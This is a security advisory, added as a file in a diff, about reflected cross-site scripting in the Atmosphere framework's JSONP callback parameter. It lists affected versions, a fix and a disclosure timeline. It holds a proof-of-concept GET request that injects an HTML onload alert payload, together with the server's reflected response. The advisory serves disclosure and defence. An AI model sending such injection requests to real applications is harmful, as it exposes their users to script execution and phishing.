@@ -1,0 +1,103 @@
+id: 30894
+date: 08/16/2018
+title: Atmosphere 1.x / 2.x Cross Site Scripting Vulnerability
+author: Lukasz D.
+cves: 
+
+#############################################################
+#
+# COMPASS SECURITY ADVISORY
+# https://www.compass-security.com/research/advisories/
+#
+#############################################################
+#
+# Product:   Atmosphere [1]
+# Vendor:    Async-IO.org
+# CSNC ID:   CSNC-2018-023
+# Subject:   Reflected Cross-Site Scripting (XSS)
+# Risk:      High
+# Effect:    Remotely exploitable
+# Author:    Lukasz D. (advisories@compass-security.com)
+# Date:      13.08.2018
+#
+#############################################################
+
+Introduction:
+-------------
+The Atmosphere Framework is the most popular asynchronous application
+development framework for enterprise Java. The Atmosphere Framework provides
+the enterprise features required to build massive scalable and real time
+asynchronous applications using transports like WebSocket, Server Sent Events
+and traditional Ajax Techniques. [2]
+
+Web applications using the Atmosphere Framework were found to be vulnerable to a
+common security flaw that allows an attacker to execute malicious code in the
+browser of users that followed a manipulated link to access the application.
+Exploiting the vulnerability allows the attacker, for instance, to redirect the
+user to a phishing page or interact with the application on behalf of the user.
+
+Affected:
+---------
+The following Atmosphere versions are vulnerable:
+- 2.4.0 - 2.4.28
+- 2.3.0 - 2.3.9
+- 2.2.0 - 2.2.12
+- 2.1.0 - 2.1.13
+- 2.0.0 - 2.0.11
+- 1.0.0 - 1.0.20
+
+Technical Description:
+----------------------
+The JSONP transport method supported by the Atmosphere Framework is vulnerable
+to a reflected Cross-Site Scripting (XSS) attack. The JSONP callback parameter
+that will be put into the server's response can contain HTML code. As the
+response does not specify the content type, it may be treated as an HTML page by
+browsers. For example, Firefox 52 ESR will execute JavaScript payload reflected
+in the response in the following proof of concept:
+
+Request:
+GET /chat?X-Atmosphere-Transport=jsonp&
+          jsonpTransport=%3Chtml%3E%3Cbody%20onload=alert(`XSS`)%3E&
+          X-Atmosphere-tracking-id=1&
+          X-Atmosphere-Framework=1&
+          X-atmo-protocol=true HTTP/1.1
+Host: [CUT]
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+
+Response:
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+X-Atmosphere-tracking-id: 1
+Expires: -1
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Date: Mon, 16 Jul 2018 13:37:00 GMT
+Connection: close
+Content-Length: 52
+
+<html><body onload=alert(`XSS`)>({"message" : "X"});
+
+Workaround / Fix:
+-----------------
+It needs to be ensured that all JSONP responses are delivered with the correct
+HTTP header: "Content-Type: application/javascript; charset=utf-8". Moreover,
+JSONP callback function should not contain any non-alphanumeric characters.
+
+Timeline:
+---------
+2018-07-16:   Vulnerability discovered
+2018-07-18:   Initial vendor notification
+2018-07-18:   Initial vendor response
+2018-07-20:   Patched version released
+2018-08-13:   Public disclosure
+
+References:
+-----------
+[1]: https://github.com/Atmosphere
+[2]: https://async-io.org/
+
+#  0day.today [2023-03-24]  #
